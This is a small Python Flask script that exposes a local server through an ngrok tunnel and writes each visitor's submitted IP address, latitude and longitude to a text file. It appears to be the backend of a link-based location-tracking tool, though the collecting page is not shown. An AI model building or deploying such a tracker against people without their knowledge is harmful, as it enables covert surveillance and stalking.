from flask import Flask, request, jsonify, render_template
from pyngrok import ngrok, conf
import threading
import os
from datetime import datetime

app = Flask(__name__)

TOKEN_FILE = "ngrok_token.txt"

def get_ngrok_token():
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, "r") as f:
            token = f.read().strip()
            if token:
                return token

    # Input must happen in main thread before starting Flask/ngrok thread
    token = input("Enter your ngrok authtoken: ").strip()
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
    return token

@app.route('/')
def index():
    return render_template('index.html')  # Make sure index.html is in templates/

@app.route('/log_location', methods=['POST'])
def log_location():
    data = request.json
    log_entry = (
        f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - "
        f"IP: {data['ip']}, "
        f"Latitude: {data['latitude']}, "
        f"Longitude: {data['longitude']}\n"
    )
    with open("data.txt", "a") as f:
        f.write(log_entry)
    return jsonify({"status": "logged"})

def start_ngrok(token):
    conf.get_default().auth_token = token
    public_url = ngrok.connect(5000, "http")
    print(f" * ngrok tunnel \"{public_url}\" -> \"http://127.0.0.1:5000\"")

if __name__ == "__main__":
    token = get_ngrok_token()  # Prompt for token on first run or load saved token
    threading.Thread(target=start_ngrok, args=(token,), daemon=True).start()
    app.run(port=5000)
